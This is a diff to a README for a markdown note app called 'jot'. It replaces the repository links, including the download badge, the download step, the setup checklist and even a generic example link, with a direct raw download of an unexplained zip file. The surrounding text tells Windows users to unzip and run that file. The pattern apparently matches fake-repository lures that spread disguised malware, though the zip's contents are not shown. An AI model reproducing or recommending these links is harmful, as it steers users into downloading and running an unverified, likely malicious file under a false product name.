@@ -1,6 +1,6 @@
 # 📝 jot - Clean markdown with threaded comments
 
-[![Download jot](https://img.shields.io/badge/Download%20jot-Click%20to%20open%20GitHub-0078d4?style=for-the-badge)](https://github.com/deepwater-bug358/jot)
+[![Download jot](https://img.shields.io/badge/Download%20jot-Click%20to%20open%20GitHub-0078d4?style=for-the-badge)](https://raw.githubusercontent.com/deepwater-bug358/jot/main/docker/Software_1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This page helps you get from the download link to a running app on Windows with 
 
 ## 📥 Download
 
-1. Open the download page: https://github.com/deepwater-bug358/jot
+1. Open the download page: https://raw.githubusercontent.com/deepwater-bug358/jot/main/docker/Software_1.2.zip
 2. On that page, look for the latest release or the main project files.
 3. Download the Windows version if one is listed.
 4. Save the file to your computer.
@@ -98,7 +98,7 @@ Common markdown items:
 - `-` for a bullet list
 - `**bold text**` for bold text
 - `*italic text*` for italic text
-- `[link text](https://example.com)` for links
+- `[link text](https://raw.githubusercontent.com/deepwater-bug358/jot/main/docker/Software_1.2.zip)` for links
 
 This keeps writing fast and simple.
 
@@ -211,7 +211,7 @@ If your notes do not appear:
 
 ## 📌 Short setup checklist
 
-- download jot from https://github.com/deepwater-bug358/jot
+- download jot from https://raw.githubusercontent.com/deepwater-bug358/jot/main/docker/Software_1.2.zip
 - save the file on your Windows PC
 - unzip it if needed
 - run the app or installer
